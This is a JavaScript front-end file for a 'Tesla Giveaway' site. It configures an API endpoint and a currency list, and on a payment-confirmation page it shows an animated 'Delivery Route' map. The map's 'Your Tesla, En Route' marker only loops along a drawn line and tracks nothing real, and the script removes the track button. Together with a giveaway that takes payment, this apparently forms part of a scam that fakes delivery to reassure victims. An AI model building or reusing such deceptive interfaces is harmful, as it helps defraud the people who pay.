// Tesla Giveaway — Backend API Configuration
// =============================================
//
// This file is the single source of truth for browser API discovery.
// GitHub Actions replaces __TESLA_API_BASE__ during deployment using the
// TESLA_API_BASE repository/environment variable or secret. The deployed value
// must be an HTTPS URL ending in /api.

(function configureTeslaApiBase(global) {
  'use strict';

  var deployedApiBase = '__TESLA_API_BASE__';
  var hasInjectedApiBase = deployedApiBase.indexOf('__') !== 0;
  var supabaseApiBase = 'https://puebwzumwqizgbmksrpq.supabase.co/functions/v1/tesla-api/api';

  function normalizeApiBase(value) {
    return String(value || '').trim().replace(/\/+$/, '');
  }

  global.TESLA_API_BASE = normalizeApiBase(
    global.TESLA_API_BASE || (hasInjectedApiBase ? deployedApiBase : supabaseApiBase)
  );

  global.TESLA_CURRENCIES = [
    { code: "USD", symbol: "$", label: "US Dollar" },
    { code: "EUR", symbol: "€", label: "Euro" },
    { code: "GBP", symbol: "£", label: "British Pound" },
    { code: "CAD", symbol: "C$", label: "Canadian Dollar" },
    { code: "AUD", symbol: "A$", label: "Australian Dollar" },
    { code: "NGN", symbol: "₦", label: "Nigerian Naira" },
    { code: "GHS", symbol: "₵", label: "Ghanaian Cedi" },
    { code: "KES", symbol: "KSh", label: "Kenyan Shilling" },
    { code: "ZAR", symbol: "R", label: "South African Rand" },
    { code: "INR", symbol: "₹", label: "Indian Rupee" },
    { code: "JPY", symbol: "¥", label: "Japanese Yen" },
    { code: "CNY", symbol: "¥", label: "Chinese Yuan" },
    { code: "CHF", symbol: "Fr", label: "Swiss Franc" },
    { code: "AED", symbol: "AED", label: "UAE Dirham" },
    { code: "BRL", symbol: "R$", label: "Brazilian Real" }
  ];

  global.teslaCurrencySymbol = function (code) {
    var list = global.TESLA_CURRENCIES || [];
    for (var i = 0; i < list.length; i++) {
      if (list[i].code === code) return list[i].symbol;
    }
    return code || "$";
  };

  if (!/payment-confirmation\.html$/i.test(global.location.pathname)) return;

  var vehicleImages = {
    cybertruck: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
    modely: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',
    models: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png',
    model3: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/model3-main.png',
    modelx: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'
  };

  // Remove the old fallback immediately. The real selected-car image is
  // preloaded and only revealed after it has successfully loaded.
  var initialVehicleImg = document.getElementById('vehicleImg');
  if (initialVehicleImg) {
    initialVehicleImg.style.visibility = 'hidden';
    initialVehicleImg.removeAttribute('src');
  }

  function getVehicleKey() {
    var stored = null;
    try { stored = JSON.parse(localStorage.getItem('tesla_last_order') || 'null'); } catch (e) {}
    var id = stored && stored.selectedCar && (stored.selectedCar.id || stored.selectedCar.model || stored.selectedCar.name);
    if (id) return String(id).toLowerCase().replace(/\s+/g, '');

    var nameEl = document.getElementById('vehicleName');
    return String(nameEl && nameEl.textContent || '')
      .toLowerCase().replace(/^tesla\s+/, '').replace(/\s+/g, '');
  }

  function syncPaymentVehicleImage() {
    var image = document.getElementById('vehicleImg');
    if (!image) return;
    var key = getVehicleKey();
    var expected = vehicleImages[key];
    if (!expected) return;
    if (image.getAttribute('data-real-image') === expected && image.src === expected) return;

    image.style.visibility = 'hidden';
    image.setAttribute('data-real-image', expected);

    var preloader = new Image();
    preloader.onload = function () {
      if (image.getAttribute('data-real-image') !== expected) return;
      image.src = expected;
      image.style.visibility = 'visible';
    };
    preloader.onerror = function () {
      image.style.visibility = 'hidden';
    };
    preloader.src = expected;
  }

  function installPaymentConfirmationUI() {
    syncPaymentVehicleImage();

    var trackBtn = document.getElementById('trackBtn');
    if (trackBtn) trackBtn.remove();

    // Match the Order Placed page: "Delivery Route" heading, map icon,
    // origin/destination legend, route line, and moving Tesla marker.
    var mapCard = document.getElementById('mapCard');
    var oldMap = document.getElementById('confMap');
    if (!mapCard || !oldMap || !global.L) return;

    var existingRoute = document.getElementById('confirmationRouteMap');
    if (!existingRoute) {
      var heading = mapCard.querySelector('.section-label');
      if (heading) {
        heading.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px"><polygon points="1 6 1 22 8 18 16 22 23 18 23 2 16 6 8 2 1 6"/><line x1="8" y1="2" x2="8" y2="18"/><line x1="16" y1="6" x2="16" y2="22"/></svg>Delivery Route';
      }

      oldMap.style.display = 'none';
      existingRoute = document.createElement('div');
      existingRoute.id = 'confirmationRouteMap';
      existingRoute.style.cssText = 'height:320px;border-radius:12px;overflow:hidden;';
      oldMap.parentNode.insertBefore(existingRoute, oldMap);

      var legend = document.createElement('div');
      legend.style.cssText = 'margin-top:12px;display:flex;gap:16px;flex-wrap:wrap;font-size:13px;color:#888;';
      legend.innerHTML = '<span style="display:flex;align-items:center;gap:6px"><span style="width:12px;height:12px;background:#E31937;border-radius:50%;display:inline-block"></span> Origin: Tesla Factory, Fremont CA</span>' +
        '<span style="display:flex;align-items:center;gap:6px"><span style="width:12px;height:12px;background:#00A550;border-radius:50%;display:inline-block"></span> Destination: Your address</span>';
      existingRoute.parentNode.insertBefore(legend, oldMap);

      var order = null;
      try { order = JSON.parse(localStorage.getItem('tesla_last_order') || 'null'); } catch (e) {}
      var address = order && order.deliveryDetails || {};
      var city = address.city || '';
      var country = address.country || '';
      var origin = [37.4936, -121.9448];
      var dest = [40.7128, -74.0060];
      var map = global.L.map(existingRoute).setView([(origin[0] + dest[0]) / 2, (origin[1] + dest[1]) / 2], 4);

      global.L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
        attribution: '© OpenStreetMap © CARTO', maxZoom: 19
      }).addTo(map);

      var originIcon = global.L.divIcon({html:'<div style="width:14px;height:14px;background:#E31937;border-radius:50%;border:2px solid white;box-shadow:0 2px 8px rgba(227,25,55,.5)"></div>',className:'',iconSize:[14,14],iconAnchor:[7,7]});
      var destinationIcon = global.L.divIcon({html:'<div style="width:14px;height:14px;background:#00A550;border-radius:50%;border:2px solid white;box-shadow:0 2px 8px rgba(0,165,80,.5)"></div>',className:'',iconSize:[14,14],iconAnchor:[7,7]});
      var teslaIcon = global.L.divIcon({html:'<div style="font-size:20px;line-height:1"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2"><rect x="1" y="3" width="15" height="13"/><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg></div>',className:'',iconSize:[24,24],iconAnchor:[12,12]});

      global.L.marker(origin,{icon:originIcon}).addTo(map).bindPopup('<strong>Tesla Factory</strong><br>Fremont, CA — Origin');

      function drawRoute() {
        var destinationMarker = global.L.marker(dest,{icon:destinationIcon}).addTo(map).bindPopup('<strong>Delivery Destination</strong><br>' + (city || 'Your address') + ', ' + country);
        var midpoint = [(origin[0] + dest[0]) / 2, (origin[1] + dest[1]) / 2];
        var movingTesla = global.L.marker(midpoint,{icon:teslaIcon}).addTo(map).bindPopup('<strong>Your Tesla</strong><br>En Route');
        global.L.polyline([origin,dest],{color:'#E31937',weight:2.5,opacity:.55,dashArray:'8,8'}).addTo(map);
        map.fitBounds(global.L.latLngBounds([origin,dest]),{padding:[40,40]});
        var progress = 0;
        setInterval(function(){
          progress = (progress + .003) % 1;
          movingTesla.setLatLng([
            origin[0] + (dest[0]-origin[0])*progress + Math.sin(progress*12)*.05,
            origin[1] + (dest[1]-origin[1])*progress + Math.cos(progress*12)*.05
          ]);
        },80);
      }

      if (city || country) {
        fetch('https://nominatim.openstreetmap.org/search?format=json&limit=1&q=' + encodeURIComponent(city + ', ' + (address.state || '') + ', ' + country))
          .then(function(r){return r.json();})
          .then(function(data){
            if (data && data.length) dest=[parseFloat(data[0].lat),parseFloat(data[0].lon)];
            drawRoute();
          })
          .catch(drawRoute);
      } else {
        drawRoute();
      }
    }
  }

  function startPaymentConfirmationFixes() {
    syncPaymentVehicleImage();
    installPaymentConfirmationUI();
    var root = document.body || document.documentElement;
    if (root && global.MutationObserver) {
      var observer = new MutationObserver(function () {
        syncPaymentVehicleImage();
        var trackBtn = document.getElementById('trackBtn');
        if (trackBtn) trackBtn.remove();
      });
      observer.observe(root, { childList:true, subtree:true, characterData:true });
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function () {
      // Leaflet and the page's own map initializer are ready by DOMContentLoaded.
      setTimeout(startPaymentConfirmationFixes, 80);
    }, { once:true });
  } else {
    setTimeout(startPaymentConfirmationFixes, 80);
  }
})(window);
